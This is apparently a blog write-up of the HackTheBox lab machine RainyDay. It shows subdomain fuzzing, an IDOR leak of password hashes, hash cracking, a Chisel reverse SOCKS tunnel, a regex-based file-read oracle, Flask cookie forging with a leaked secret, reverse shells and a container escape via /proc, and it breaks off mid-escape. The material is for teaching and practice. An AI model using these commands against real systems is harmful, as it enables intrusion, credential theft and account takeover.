---
title: HTB: RainyDay
url: https://0xdf.gitlab.io/2023/02/18/htb-rainyday.html
date: 2023-02-18T14:45:00+00:00
difficulty: Hard [40]
os: Linux
tags: hackthebox, ctf, htb-rainyday, nmap, ffuf, subdomain, docker, container, feroxbuster, idor, john, chisel, foxyproxy, socks, proxychains, api, flask, flask-cookie, python, python-requests, youtube, flask-unsign, jail, python-use-after-free, unicode, emoji, john-rules, htb-scanned
---

![RainyDay](https://0xdfimages.gitlab.io/img/rainyday-cover.png)

RainyDay is a different kind of machine from HackTheBox. It’s got a lot of enumerating and fuzzing to find next steps and a fair amount of programming required to solve. I’ll start by exploiting an IDOR vulnerability to leak hashes, cracking one and getting access to a website that manages containers. From inside a container, I can reach a dev instance and an API that effectively let’s me apply a given regex to a file on the filesystem, which I’ll turn into a file read exploit with some Python scripting. From there I can leak the flask secret key and get into another user’s account, where I’ll find a misconfiguration that allows me to escape the container’s jail and read the user’s private SSH key. From the host, I’ll first exploit Python itself to get execution as the next user. Then I’ll abuse unicode characters to slip more characters than allowed into a hashing program, and use that to brute force a secret salt, allowing me to crash the root hash. In Beyond Root, I’ll look at a mistake that allowed for skipping a large part of this box.

## Box Info

| Name | [RainyDay](https://hackthebox.com/machines/rainyday)  [RainyDay](https://hackthebox.com/machines/rainyday) [Play on HackTheBox](https://hackthebox.com/machines/rainyday) |
| --- | --- |
| Release Date | [15 Oct 2022](https://twitter.com/hackthebox_eu/status/1580574128939028481) |
| Retire Date | 18 Feb 2023 |
| OS | Linux Linux |
| Base Points | Hard [40] |
| Rated Difficulty | Rated difficulty for RainyDay |
| Radar Graph | Radar chart for RainyDay |
| First Blood User | 01:48:31[Geiseric Geiseric](https://app.hackthebox.com/users/184611) |
| First Blood Root | 05:11:34[jazzpizazz jazzpizazz](https://app.hackthebox.com/users/87804) |
| Creator | [InfoSecJack InfoSecJack](https://app.hackthebox.com/users/52045) |

## Recon

### nmap

`nmap` finds two open TCP ports, SSH (22) and HTTP (80):

```

oxdf@hacky$ nmap -p- --min-rate 10000 10.10.11.184
Starting Nmap 7.80 ( https://nmap.org ) at 2023-02-09 22:12 UTC
Nmap scan report for 10.10.11.184
Host is up (0.086s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 7.02 seconds
oxdf@hacky$ nmap -p 22,80 -sCV 10.10.11.184
Starting Nmap 7.80 ( https://nmap.org ) at 2023-02-09 22:13 UTC
Nmap scan report for 10.10.11.184
Host is up (0.087s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://rainycloud.htb
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.02 seconds

```

Based on the [OpenSSH](https://packages.ubuntu.com/search?keywords=openssh-server) version, the host is likely running Ubuntu 22.04 jammy.

The webserver is returning a redirect to `http://rainycloud.htb`.

### Subdomain Fuzz

Given the use of DNS names on the website, I’ll fuzz for any potential subdomains that respond differently from the default case with `ffuf`:

```

oxdf@hacky$ ffuf -u http://10.10.11.184 -H "Host: FUZZ.rainycloud.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --fs 229

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.5.0
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.11.184
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.rainycloud.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
 :: Filter           : Response size: 229
________________________________________________

dev                     [Status: 403, Size: 26, Words: 5, Lines: 1, Duration: 110ms]
:: Progress: [4989/4989] :: Job [1/1] :: 443 req/sec :: Duration: [0:00:12] :: Errors: 0 ::

```

I’m filtering for responses that are of length 229, and there’s only one that is different. I’ll add both `rainycloud.htb` and `dev.rainycloud.htb` to my `/etc/hosts` file.

### Website - TCP 80

#### Site

The site is for a cloud-based Docker container hosting service:

![image-20230210115420693](https://0xdfimages.gitlab.io/img/image-20230210115420693.png)

The jack user has a container named “secrets”, which seems like a good target at some point.

The page mentions that a documented API is coming in the next release. The login page has a normal form a well as a link to a registration:

![image-20230210115754725](https://0xdfimages.gitlab.io/img/image-20230210115754725.png)

If I try to register, it returns that registration is currently closed:

![image-20230210115840867](https://0xdfimages.gitlab.io/img/image-20230210115840867.png)

#### Tech Stack

I’m not able to guess the programming language with by guessing at the index page. `index.html`, `index.php`, and `index` all come back 404 not found.

The response headers don’t provide any additional insight:

```

HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Fri, 10 Feb 2023 17:00:42 GMT
Content-Type: text/html; charset=utf-8
Connection: close
Content-Length: 4378

```

Based on the lack of use of file extensions, it’s fair to guess that the server is running Python or Ruby, but I don’t know for sure.

#### Directory Brute Force

I’ll run `feroxbuster` against the site:

```

oxdf@hacky$ feroxbuster -u http://rainycloud.htb

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.7.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://rainycloud.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.7.1
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
200      GET       63l      142w     3254c http://rainycloud.htb/login
200      GET      110l      270w     4378c http://rainycloud.htb/
200      GET       68l      157w     3686c http://rainycloud.htb/register
302      GET        5l       22w      189c http://rainycloud.htb/logout => /
308      GET        5l       22w      239c http://rainycloud.htb/api => http://rainycloud.htb/api/
302      GET        5l       22w      199c http://rainycloud.htb/new => /login
200      GET        1l        1w       59c http://rainycloud.htb/api/list
200      GET        1l        1w       29c http://rainycloud.htb/api/healthcheck
[####################] - 4m     90000/90000   0s      found:8       errors:1      
[####################] - 4m     30000/30000   113/s   http://rainycloud.htb 
[####################] - 4m     30000/30000   112/s   http://rainycloud.htb/ 
[####################] - 4m     30000/30000   112/s   http://rainycloud.htb/api 

```

`/api` is interesting.

#### /api

This page lists the various in development API endpoints for the service:

![image-20230210122157558](https://0xdfimages.gitlab.io/img/image-20230210122157558.png)

Each of these returns limited information:

```

oxdf@hacky$ curl http://rainycloud.htb/api/list
{"secrets":{"image":"alpine-python:latest","user":"jack"}}
oxdf@hacky$ curl http://rainycloud.htb/api/healthcheck
{"result":true,"results":[]}
oxdf@hacky$ curl http://rainycloud.htb/api/user/1
{"Error":"Not allowed to view other users info!"}

```

It says that `healthcheck` is only availably internally, so it’s not surprising that it returns nothing here. Similarly, the error on `user/1` seems expected since I am not authenticated in any way. Interestingly, for user id 4, `/api/user` returns something different:

```

oxdf@hacky$ curl http://rainycloud.htb/api/user/4
{}

```

#### Fuzz Users

My theory is that user 1 exists and that 4 does not. I can fuzz this to look for any other users:

```

oxdf@hacky$ ffuf -w <( seq 1 1000 ) -u http://rainycloud.htb/api/user/FUZZ -fs 3

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.5.0
________________________________________________

 :: Method           : GET
 :: URL              : http://rainycloud.htb/api/user/FUZZ
 :: Wordlist         : FUZZ: /dev/fd/63
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
 :: Filter           : Response size: 3
________________________________________________

3                       [Status: 200, Size: 50, Words: 7, Lines: 2, Duration: 104ms]
1                       [Status: 200, Size: 50, Words: 7, Lines: 2, Duration: 188ms]
2                       [Status: 200, Size: 50, Words: 7, Lines: 2, Duration: 227ms]
:: Progress: [1000/1000] :: Job [1/1] :: 268 req/sec :: Duration: [0:00:03] :: Errors: 0 ::

```

Since `ffuf` doesn’t have the range capability that `wfuzz` does, I’m using the `<( )` Bash syntax to run the `seq` command and have the output be treated as if it’s being read from a file.

Only 1, 2, and 3 seem to exist, but I still can’t access data on any of them.

### dev.rainycloud.htb

Visiting this site just returns a 403 Forbidden:

```

HTTP/1.1 403 FORBIDDEN
Server: nginx/1.18.0 (Ubuntu)
Date: Fri, 10 Feb 2023 17:11:08 GMT
Content-Type: text/html; charset=utf-8
Connection: close
Content-Length: 26

Access Denied - Invalid IP

```

I’ll keep an eye out for a way to access it from RainyDay itself.

## Shell in Container

### Site Auth as gary

#### IDOR

Typically people think of insecure direct object reference (IDOR) vulnerabilities as changing the user ID from 1 to 2 and getting back data that I’m not supposed to get. But there are other ways that an IDOR can expose data. Some poking around at the API shows that while `/api/user/1` returns an error, `/api/user/1.0` does not!:

```

oxdf@hacky$ curl http://rainycloud.htb/api/user/1.0
{"id":1,"password":"$2a$10$bit.DrTClexd4.wVpTQYb.FpxdGFNPdsVX8fjFYknhDwSxNJh.O.O","username":"jack"}

```

I’ll explore what’s going on here in [Beyond Root](#beyond-root). I’ll grab the other two:

```

oxdf@hacky$ curl http://rainycloud.htb/api/user/2.0
{"id":2,"password":"$2a$05$FESATmlY4G7zlxoXBKLxA.kYpZx8rLXb2lMjz3SInN4vbkK82na5W","username":"root"}
oxdf@hacky$ curl http://rainycloud.htb/api/user/3.0
{"id":3,"password":"$2b$12$WTik5.ucdomZhgsX6U/.meSgr14LcpWXsCA0KxldEw8kksUtDuAuG","username":"gary"}

```

I’ll also confirm that no other users show up this way with `ffuf`:

```

oxdf@hacky$ ffuf -w <( seq 1 1000 ) -u http://rainycloud.htb/api/user/FUZZ.0 -fs 3

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.5.0
________________________________________________

 :: Method           : GET
 :: URL              : http://rainycloud.htb/api/user/FUZZ.0
 :: Wordlist         : FUZZ: /dev/fd/63
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
 :: Filter           : Response size: 3
________________________________________________

1                       [Status: 200, Size: 101, Words: 1, Lines: 2, Duration: 96ms]
2                       [Status: 200, Size: 101, Words: 1, Lines: 2, Duration: 171ms]
3                       [Status: 200, Size: 101, Words: 1, Lines: 2, Duration: 203ms]
:: Progress: [1000/1000] :: Job [1/1] :: 364 req/sec :: Duration: [0:00:03] :: Errors: 0 ::

```

#### Crack Hashes

I’ll save the hashes into a file:

```

jack:$2a$10$bit.DrTClexd4.wVpTQYb.FpxdGFNPdsVX8fjFYknhDwSxNJh.O.O
root:$2a$05$FESATmlY4G7zlxoXBKLxA.kYpZx8rLXb2lMjz3SInN4vbkK82na5W
gary:$2b$12$WTik5.ucdomZhgsX6U/.meSgr14LcpWXsCA0KxldEw8kksUtDuAuG

```

Feeding these into `john` along with `rockyou.txt`, it cracks one of the passwords in about four minutes:

```

oxdf@hacky$ john hashes --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 3 password hashes with 3 different salts (bcrypt [Blowfish 32/64 X3])
Loaded hashes with cost 1 (iteration count) varying from 32 to 4096
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
rubberducky      (gary) 
...[snip]...

```

None of the others broke and after a few minutes, I’ll kill it and move on.

Back at the web page, I’m able to log in as gary.

### Access Container

#### Enumeration

Authenticated, I have access to `/containers` which talks about how to create a container, and shows gray has no containers running currently:

![image-20230210152332874](https://0xdfimages.gitlab.io/img/image-20230210152332874.png)

Clicking “New Container” asks for a name and an image:

![image-20230210152409586](https://0xdfimages.gitlab.io/img/image-20230210152409586.png)

Now it shows up at the bottom of the containers page:

![image-20230210152438899](https://0xdfimages.gitlab.io/img/image-20230210152438899.png)

On clicking “Execute Command”, the site returns `command_output.txt`. For example, on giving it “id”, it returns:

```

uid=1337 gid=1337

```

That’s an odd `id` output. `whoami` returns:

```

whoami: unknown uid 1337

```

It seems I’m running as an unknown user.

“Execute Command (background)” doesn’t return anything, and the button stays disabled until I refresh the page.

Trying to run `ping` returns an error that it can’t run without root:

```

PING 10.10.14.6 (10.10.14.6): 56 data bytes
ping: permission denied (are you root?)

```

`curl` isn’t on the box, but `wget` is. When I send `wget 10.10.14.6`, there’s a request at my Python webserver, and then the response says:

```

Connecting to 10.10.14.6 (10.10.14.6:80)
wget: can't open 'index.html': Permission denied

```

That implies that the current user doesn’t have write permissions in the current directory. I’ll try changing the output to different directories, but it always fails. Interestingly, if I try to save it as a name without an extension, it does work:

```

Connecting to 10.10.14.6 (10.10.14.6:80)
saving to '/tmp/index'
index                100% |********************************|   532  0:00:00 ETA
'/tmp/index' saved

```

#### Shell

I can get a shell in the container. I used the `alpine-python:latest` container, which means there is Python. `python` isn’t in the path, but `python3` is. I’ll generate a “Python3 #2” reverse shell from [revshells.com](https://www.revshells.com/), and run it as as a background command. It connects back, with some odd chacters but otherwise working fine:

```

oxdf@hacky$ nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.184 41814
/ $ ^[[49;5Rpwd
/
/ $ ^[[49;5Rls
bin      home     media    proc     sbin     tmp
dev      lib      mnt      root     srv      usr
etc      logfile  opt      run      sys      var
console?prompt=/%20$%20^[[49;5R

```

The container is basically empty, which isn’t surprising, as it’s a container I just created. That said, there is a misconfiguration in how this container runs background commands that would let me skip several of the next steps, which I’ll cover in [Beyond Root](#beyond-root).

## Shell as jack

### Access to dev

#### Create Socks Proxy

I’ll give my container commands to upload [Chisel](https://github.com/jpillora/chisel) in to the container, first with `wget http://10.10.14.6/chisel_1.8.1_linux_amd64 -O /tmp/c`, and then with `chmod +x /tmp/c`. An empty return on the second command indicates success. I’ll start up my server (`./chisel_1.8.1_linux_amd64 server -p 8000 --reverse`, using a different port since Burp already listens on the default port, 8080), and the connect back with a background command (since I want it to be long running) of `/tmp/c client 10.10.14.6:8000 R:socks`. The background commands don’t return anything, but there’s a connection at my Chisel server:

```

2023/02/10 21:46:43 server: session#1: tun: proxy#R:127.0.0.1:1080=>socks: Listening

```

#### Configure Traffic

I use FoxyProxy to manage how my traffic proxies out of Firefox in my hacking VM. Most of the time, I leave it in “Use Enabled Proxies By Pattern and Order” mode, and I’ve got patterns to send most HTB and CTF traffic through Burp (see [this video where I set that up](https://www.youtube.com/watch?v=iTm33Miymdg)).

I’ve also got a profile in FoxyProxy I call Local SOCKS 1080:

![image-20230210170109823](https://0xdfimages.gitlab.io/img/image-20230210170109823.png)

This one will skip Burp, and go directly to a SOCKS on localhost 1080, which is just what Chisel is providing. I’ll add a pattern for this proxy for `*dev.rainycloud.htb*`. It comes before Burp in my priority order, so it’ll route all the traffic to dev via the tunnel. It works:

![image-20230210170451666](https://0xdfimages.gitlab.io/img/image-20230210170451666.png)

### Enumerating healthcheck

#### Access Full API

I’ll remember that `/api/healthcheck` was limited from non-local hosts. I’ll try it now via the proxy, but same result:

```

oxdf@hacky$ proxychains curl -s rainycloud.htb/api/healthcheck
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.14
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.10.11.184:80  ...  OK
{"result":true,"results":[]}

```

However, if I try it on `dev/rainycloud.htb`, it returns data:

```

oxdf@hacky$ proxychains curl -s dev.rainycloud.htb/api/healthcheck | jq '.'
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.14
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.10.11.184:80  ...  OK
{
  "result": true,
  "results": [
    {
      "file": "/bin/bash",
      "pattern": {
        "type": "ELF"
      }
    },
    {
      "file": "/var/www/rainycloud/app.py",
      "pattern": {
        "type": "PYTHON"
      }
    },
    {
      "file": "/var/www/rainycloud/sessions/db.sqlite",
      "pattern": {
        "type": "SQLITE"
      }
    },
    {
      "file": "/etc/passwd",
      "pattern": {
        "pattern": "^root.*",
        "type": "CUSTOM"
      }
    }
  ]
}

```

It seems to be doing some kind of pattern matching on files. I don’t totally understand it yet. It does also give the full path to an `app.py` file which seems likely to be what’s running this website.

#### POST

To see what else this endpoint can do, I’ll try a POST request:

```

oxdf@hacky$ proxychains curl -X POST -s dev.rainycloud.htb/api/healthcheck
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.14
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.10.11.184:80  ...  OK
Unauthenticated

```

It wants auth. That suggests there is something more it can do.

I’ll grab the cookie out of my authenticated session (on either the main site, or gary’s creds work on dev as well - the two pages must share the same JWT signing secret), and add that to the `curl` command:

```

oxdf@hacky$ proxychains curl -X POST -s -b "session=eyJ1c2VybmFtZSI6ImdhcnkifQ.Y-bDzQ.J0GxuiLGLbskMaSSqEs_TaEI9k0" dev.rainycloud.htb/api/healthcheck
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.14
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.10.11.184:80  ...  OK
ERROR - missing parameter

```

#### Find Parameters

The error message says it needs a parameter. I could try to fuzz this, I’ll start with an educated guess based on what I know. This took a bit of guesswork, as adding either on it’s own didn’t change the “ERROR - missing parameter” message, but with both `file` and `type` it works:

```

oxdf@hacky$ proxychains curl -d "file=/bin/bash&type=ELF" -s -b "session=eyJ1c2VybmFtZSI6ImdhcnkifQ.Y-bDzQ.J0GxuiLGLbskMaSSqEs_TaEI9k0" dev.rainycloud.htb/api/healthcheck | jq .
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.14
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.10.11.184:80  ...  OK
{
  "result": true,
  "results": [
    {
      "file": "/bin/bash",
      "pattern": {
        "type": "ELF"
      }
    }
  ]
}

```

#### Type

Sending `file=/bin/bash&type=ELF` returns a result of `true`. Changing `type` to `PYTHON`, `result` changes to `false` (I’ll snip out the `proxychains` message for readability from here on):

```

oxdf@hacky$ proxychains curl -X POST -d "file=/bin/bash&type=ELF" -s -b "session=eyJ1c2VybmFtZSI6ImdhcnkifQ.Y-bDzQ.J0GxuiLGLbskMaSSqEs_TaEI9k0" dev.rainycloud.htb/api/healthcheck | jq '.result'
true
oxdf@hacky$ proxychains curl -d "file=/bin/bash&type=PYTHON" -s -b "session=eyJ1c2VybmFtZSI6ImdhcnkifQ.Y-bDzQ.J0GxuiLGLbskMaSSqEs_TaEI9k0" dev.rainycloud.htb/api/healthcheck | jq '.result'
false

```

If I change `type` to something that wasn’t in the example, it returns a 500 error:

```

oxdf@hacky$ proxychains curl -d "file=/bin/bash&type=0xdf" -s -b "session=eyJ1c2VybmFtZSI6ImdhcnkifQ.Y-bDzQ.J0GxuiLGLbskMaSSqEs_TaEI9k0" dev.rainycloud.htb/api/healthcheck
<!doctype html>
<html lang=en>
<title>500 Internal Server Error</title>
<h1>Internal Server Error</h1>
<p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p>

```

If `type` is `CUSTOM`, there’s another error:

```

oxdf@hacky$ proxychains curl -X POST -d "file=/bin/bash&type=CUSTOM" -s -b "session=eyJ1c2VybmFtZSI6ImdhcnkifQ.Y-bDzQ.J0GxuiLGLbskMaSSqEs_TaEI9k0" dev.rainycloud.htb/api/healthcheck
Pattern required when using custom type

```

In the example, the `pattern` was `^root.*`, which is the regular expression for starts with “root” and then followed by 0 or more of any character. My theory is that the regex is applied to the contents of the file, and `result` is set based on if it matches.

To test this, I’ll experiment on `/etc/hostname`. It seems reasonable to guess that the file does not start with “a”, and sending a `pattern` of `^a.*` does return false:

```

oxdf@hacky$ proxychains curl -X POST -d "file=/etc/hostname&type=CUSTOM&pattern=^a.*" -s -b "session=eyJ1c2VybmFtZSI6ImdhcnkifQ.Y-bDzQ.J0GxuiLGLbskMaSSqEs_TaEI9k0" dev.rainycloud.htb/api/healthcheck | jq .result
false

```

It might reasonably start with “r”, and changing `pattern` to `^r.*` does in fact return `true`:

```

oxdf@hacky$ proxychains curl -X POST -d "file=/etc/hostname&type=CUSTOM&pattern=^r.*" -s -b "session=eyJ1c2VybmFtZSI6ImdhcnkifQ.Y-bDzQ.J0GxuiLGLbskMaSSqEs_TaEI9k0" dev.rainycloud.htb/api/healthcheck | jq .result
true

```

### File Read

The full process of my creating a script to read files here in [this video](https://www.youtube.com/watch?v=cu_wOqZbCqw):

The final script is available [here](https://gitlab.com/0xdf/ctfscripts/-/blob/master/htb-rainyday/file_read.py).

### Website Access as jack

#### Read Web Source

I’ll use the script to read the source for the web application at the path leaked by `/api/healthcheck` on dev. It’s very slow, but at the top of the file, after all the other imports, there’s an import of `SECRET_KEY`:

```

#!/usr/bin/python3 
                                        
import re                     
from flask import *
import docker
import bcrypt                                  
import socket       
import string
from flask_sqlalchemy import SQLAlchemy 
from os.path import exists
from hashlib import md5
from inspect import currentframe, getframeinfo 
from urllib.parse import urlparse 
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address

#secrets.py 
from secrets import SECRET_KEY

app = Flask(__name__, static_url_path="")
app.config['SECRET_KEY'] = SECRET_KEY
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///sessions/db.sqlite' 

limiter = Limiter( 
...[snip]...

```

I’ll read `secrets.py` from the same directory:

```

oxdf@hacky$ python file_read.py /var/www/rainycloud/secrets.py
SECRET_KEY = 'f77dd59f50ba412fcfbd3e653f8f3f2ca97224dd53cf6304b4c86658a75d8f67' 

```

#### Cookie Generation

I’ll notice that when I log into the website as gary, there’s a `session` cookie that gets set. Firefox dev tools breaks it out a bit:

![image-20230214102641081](https://0xdfimages.gitlab.io/img/image-20230214102641081.png)

With three parts of base64-encoded data separated by `.`, that looks like a JWT or a Flask cookie. Given the fact that this web application is written in Flask, I’ll start there. [flask-unsign](https://github.com/Paradoxis/Flask-Unsign) is a tool for Flask cookies. I can check if the secret key I leaked works with the cookie by passing that as the wordlist to the `--unsign` command:

```

oxdf@hacky$ flask-unsign --unsign --cookie 'eyJ1c2VybmFtZSI6ImdhcnkifQ.Y-uqBA.o46_JCuR7NsHaRVAbUnwdhaoUfI' -w <( echo "f77dd59f50ba412fcfbd3e653f8f3f2ca97224dd53cf6304b4c86658a75d8f67" )
[*] Session decodes to: {'username': 'gary'}
[*] Starting brute-forcer with 8 threads..
[+] Found secret key after 1 attempts
'f77dd59f50ba412fcfbd3e653f8f3f2ca97224dd53cf6304b4c86658a75d8f67'

```

I’m using the `<( )` Bash syntax to have the results of what’s in the middle be handled as if it’s in a file. It matches.

With the secret I can craft cookies for any use I want. I already enumerated the users, and I’ve noticed that jack has a container running named Secrets. I’ll create a cookie as jack:

```

oxdf@hacky$ flask-unsign --sign --cookie "{'username': 'jack'}" --secret "f77dd59f50ba412fcfbd3e653f8f3f2ca97224dd53cf6304b4c86658a75d8f67"
eyJ1c2VybmFtZSI6ImphY2sifQ.Y-vWgA.jUSvqhy4bQg1sgdiag_VgV_f_ec

```

I’ll add that cookie to Firefox for `rainycloud.htb` and refresh the page to be logged in as jack with access to the “secrets” container:

![image-20230214134651354](https://0xdfimages.gitlab.io/img/image-20230214134651354.png)

### secrets Container

#### Shell

Now with access to the secrets container, when I run commands, they run as UID 1000. For example, if I “Execute Command” and put in `id`, it returns `uid=1000 gid=1000`. That’s different than gary’s container, which showed UID 1337 (at least for “Execute Command” - See [Beyond Root](#beyond-root)).

Just like with the previous container, secrets is running alpine-python, so I’ll grab a Python reverse shell from [revshells.com](https://www.revshells.com/). It only has `python3` (no `python`), so I’ll make sure that’s correct and send it as a “Execute Command (background)”, getting a shell:

```

oxdf@hacky$ nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.184 55194
/ $ ^[[49;5R

```

`script` isn’t installed, but I can use `python3` to get a PTY and then do the standard [shell upgrade](https://www.youtube.com/watch?v=DqE6DxqJg8Q):

```

/ $ ^[[49;5Rpython3 -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'
Traceback (most recent call last):
  File "<string>", line 1, in <module>
  File "/usr/lib/python3.9/pty.py", line 158, in spawn
    os.execlp(argv[0], *argv)
  File "/usr/lib/python3.9/os.py", line 557, in execlp
    execvp(file, args)
  File "/usr/lib/python3.9/os.py", line 574, in execvp
    _execvpe(file, args)
  File "/usr/lib/python3.9/os.py", line 597, in _execvpe
    exec_func(file, *argrest)
FileNotFoundError: [Errno 2] No such file or directory
/ $ ^[[49;5R^Z
[1]+  Stopped                 nc -lnvp 443
oxdf@hacky$ stty raw -echo ; fg
nc -lnvp 443
            reset
/ $

```

#### Processes

Containers are virtual spaces, but they are sharing process space with the host. Looking at the processes, it’s worth looking at what is running:

```

/ $ ps auxww                                     
PID   USER     TIME  COMMAND             
    1 root      0:14 {systemd} /sbin/init       
    2 root      0:00 [kthreadd]                  
    3 root      0:00 [rcu_gp]              
    4 root      0:00 [rcu_par_gp]        
    5 root      0:00 [netns]        
    7 root      0:00 [kworker/0:0H-ev]  
    9 root      0:07 [kworker/0:1H-kb]
...[snip]...
 1194 root      0:00 /usr/sbin/cron -f -P
 1195 1000      0:00 sleep 100000000
 1203 root     12:12 /usr/bin/containerd
 1220 root      0:00 /sbin/agetty -o -p -- \u --noclear tty1 linux
 1229 root      0:00 sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups
 1240 root      0:00 nginx: master process /usr/sbin/nginx -g daemon on; master
 1241 xfs       0:25 nginx: worker process
 1242 xfs       1:31 nginx: worker process
 1255 root      2:26 /usr/bin/dockerd -H fd:// --containerd=/run/containerd/con
 1482 root      0:00 /usr/bin/docker-proxy -proto tcp -host-ip 0.0.0.0 -host-po
 1506 root      0:00 /usr/bin/docker-proxy -proto tcp -host-ip :: -host-port 49
 1520 root      0:00 /usr/bin/docker-proxy -proto tcp -host-ip 0.0.0.0 -host-po
 1526 root      0:00 /usr/bin/docker-proxy -proto tcp -host-ip :: -host-port 40
 1541 root      0:55 /usr/bin/containerd-shim-runc-v2 -namespace moby -id c0fe8
 1563 root      0:26 tail -f /logfile
...[snip]...

```

There’s a bunch of system stuff started as root. There’s a cron running as root that’s immediately followed by a really long `sleep` as uid 1000. There’s also a bunch of `docker` stuff, and then (not shown above) my exploitation stuff.

#### Container Jail Escape

The long `sleep` process is by uid 1000, which is the same id that my shell is currently running as:

```

/ $ id
uid=1000 gid=1000

```

I’ll go into the `/proc` folder for the long `sleep` process:

```

/ $ cd /proc/1195
/proc/1195 $ ls
arch_status         limits              root
attr                loginuid            sched
autogroup           map_files           schedstat
auxv                maps                sessionid
cgroup              mem                 setgroups
clear_refs          mountinfo           smaps
cmdline             mounts              smaps_rollup
comm                mountstats          stack
coredump_filter     net                 stat
cpu_resctrl_groups  ns                  statm
cpuset              numa_maps           status
cwd                 oom_adj             syscall
environ             oom_score           task
exe                 oom_score_adj       timens_offsets
fd                  pagemap             timers
fdinfo              patch_state         timerslack_ns
gid_map             personality         uid_map
io                  projid_map          wchan

```

`cwd` is a symlink to the actual working directory, and it points to `/home/jack`:

```

/proc/1195 $ ls -l cwd
lrwxrwxrwx    1 1000     1000             0 Feb 14 19:07 cwd -> /home/jack

```

That isn’t in the container, but rather on the host. The container is `chroot`-ed into the container part of the host file system (I’ve looked at this before in [container breakouts](/2021/05/17/digging-into-cgroups.html) and in [Scanned](/2022/09/10/htb-scanned.html#sandbox-exploit)).

But with this foothold into the host file system, I can look outside the jail and into that directory:

```

/proc/1195 $ ls -la cwd/
total 36
drwxr-x---    4 1000     1000          4096 Feb 14 18:52 .
drwxr-xr-x    4 root     root          4096 Sep 29 13:47 ..
lrwxrwxrwx    1 root     root             9 Sep 29 12:16 .bash_history -> /dev/null
-rw-r--r--    1 1000     1000           220 Jan  6  2022 .bash_logout
-rw-r--r--    1 1000     1000          3771 Jan  6  2022 .bashrc
drwx------    2 1000     1000          4096 Feb 10 22:44 .cache
